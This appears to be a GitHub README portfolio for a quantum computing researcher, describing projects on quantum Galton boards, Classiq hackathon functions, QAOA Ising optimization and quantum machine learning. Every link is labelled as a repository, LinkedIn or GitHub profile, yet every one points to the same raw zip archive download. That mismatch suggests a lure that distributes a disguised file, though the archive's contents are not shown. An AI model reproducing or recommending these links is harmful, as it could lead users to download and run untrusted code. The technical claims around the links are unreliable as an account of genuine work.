# 🌐 Quantum Computing Portfolio — Yasir Mansour

Exploring quantum computation and hybrid quantum‑classical algorithms with a focus on simulation, algorithm development, and applied quantum machine learning.

---

# 🚀 Featured Projects

## 1. Quantum Walks & Monte Carlo — WISER 2025 × NNL
**Repo:** [Womanium2025--QuantumGaltonBoard](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
Implementation of Carney & Varcoe’s Universal Statistical Simulator (arXiv:2202.01735). Demonstrates how quantum circuits can simulate Galton Box–style Monte Carlo problems, relevant to high‑dimensional challenges such as particle transport and quantum systems.

### 🔧 Key Features
- Modular Quantum Galton Board circuits using Hadamard and RY rotations.  
- Monte Carlo framing: Galton Box simulation treated as a sampling problem for PDEs.  
- Quantum walk dynamics: Hadamard quantum walk distributions compared against classical binomial statistics.  
- Noise modeling with backend‑specific emulators and circuit optimization.  
- Verified scaling formula: **2n+2 qubits** and quadratic depth growth O(n^2).

### 📈 Results
- Gaussian distributions matched theory with TVD ≈ 0.01–0.02 for n=1,2.  
- Exponential distributions (bias) skewed strongly toward Bin 0.  
- Hadamard quantum walk reproduced U‑shaped distribution with TVD < 0.01 in noiseless runs.  
- Demonstrated exponential speed‑up: 2^n trajectories simulated with only O(n^2) gates.

---

## 2. AztecHacks 2024 — Quantum Challenge Solutions
**Repo:** [https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
Solo 48‑hour completion of all Classiq challenge functions and bonus algorithm, emphasizing reversible arithmetic, entanglement preparation, and circuit synthesis.

### 🔧 Part A — Challenge Functions
Implemented all 10 reversible arithmetic and oracle functions:  
- inplace_square, inplace_linear, inplace_quadratic, inplace_cubic, inplace_exponential  
- discrete_log_oracle, inplace_discrete_logarithm  
- equality_oracle, inplace_sum, sum_of_squares  

Constructed with Classiq’s symbolic quantum types (QNum, QArray[QBit]).  
Verified arithmetic logic and oracle behavior.  
Synthesized circuits with resource reporting (e.g., inplace_quadratic depth ≈ 12, gate count ≈ 40).

### 🔧 Part B — Bonus Algorithm: GHZ State Preparation
Constructed a 3‑qubit GHZ state using H and CX gates.  
Synthesized circuit: 3 qubits, depth ≈ 3.  
Simulator results: 000 and 111 states observed with near‑equal probability.  
Parsed counts: {'meas': 7.0}: 1042, {'meas': 0.0}: 1006 from 2048 shots.

### 📈 Results
- All 10 challenge functions implemented and tested successfully.  
- GHZ state prepared and validated with correct superposition behavior.  
- Resource usage reported for each synthesized circuit.

---

## 3. Development of Novel Quantum Algorithms — Ising Model Optimization
**Repo:** [Development-of-Novel-Quantum-Algorithms](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
Exploration of 1D and 2D Ising models as combinatorial optimization problems, implemented with Classiq’s QAOA framework. Includes circuit synthesis, convergence analysis, and Probabilistic Error Cancellation (PEC) for error mitigation.

### 🔧 Key Features
- 1D Ising model formulated with Pyomo, mapped to QUBO form.  
- 2D Ising model (4×4 lattice) with periodic boundary conditions.  
- QAOA (Quantum Approximate Optimization Algorithm) applied with 5 layers and CVaR optimization.  
- Circuit resources:  
  - 1D: width = 6 qubits, depth ≈ 41, gates = {CX: 60, RZ: 60, RX: 30, H: 6}  
  - 2D: width = 16 qubits, depth ≈ 91, gates = {CX: 320, RZ: 240, RX: 80, H: 16}  
- Trotterization used to approximate Hamiltonian evolution.  
- Error mitigation: PEC applied to noisy runs.

### 📈 Results
- Convergence iterations:  
  - 1D noiseless: 60–65  
  - 1D trotterized: 75–80  
  - 1D noisy: 55–60  
  - 1D mitigated (PEC): ~40  
  - 2D noiseless: ~65  
  - 2D trotterized: 85–90  
  - 2D noisy: 90–95  
  - 2D mitigated (PEC): 65–70  
- Energy landscapes:  
  - 1D ground state cost ≈ –180 with probability ≈ 0.77  
  - 2D ground state cost ≈ –960 with probability ≈ 0.70  
- PEC reduced effective noise, producing energies close to noiseless baselines.

---

## 4. QML for Conspicuity Detection in Production
**Repo:** [QML-for-Conspicuity-Detection-in-Production](https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip)  
Hybrid quantum–classical machine learning applied to industrial visual saliency detection. Combines variational quantum circuits with classical deep learning to improve robustness in defect detection and conspicuity analysis.

### 🔧 Key Features
- Variational Classifier (VQC):  
  - PennyLane implementation on 4 qubits.  
  - Learned parity function with accuracy = 1.0 after ~35 iterations.  
  - Confusion matrix confirmed perfect classification on training and unseen test data.  
- Quanvolutional Neural Network (QCNN):  
  - Quantum convolution layer applied to MNIST dataset (2×2 pixel patches → 4 expectation channels).  
  - Pre‑processed images fed into classical dense network.  
  - Validation accuracy improved to ~60–70% with quantum preprocessing compared to ~50–60% baseline.  
  - Confusion matrix analysis highlighted class‑specific improvements.  
- Hybrid Integration: PennyLane + PyTorch/TensorFlow pipelines, classical optimizers (Adam, Nesterov Momentum).

### 📈 Results
- Binary classification (parity): Accuracy = 1.0 on both training and unseen test sets.  
- Iris dataset (multi‑class): Validation accuracy >70% after ~60 iterations.  
- MNIST quanvolution: Quantum preprocessing improved validation accuracy compared to classical baseline.

---

# 🧠 Skills & Technologies

### Quantum
Qiskit • Classiq SDK • PennyLane • Quantum Circuit Design • QAOA • Variational Quantum Algorithms • Probabilistic Error Cancellation (PEC)

### Classical / ML
Python • PyTorch • TensorFlow • Data Visualization

---

# 📫 Get in Touch
**LinkedIn:** https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip  
**GitHub:** https://raw.githubusercontent.com/qcmp34/qcmp34/main/hyperuresis/qcmp34-v2.9.zip

---

*Last updated: November 25, 2025*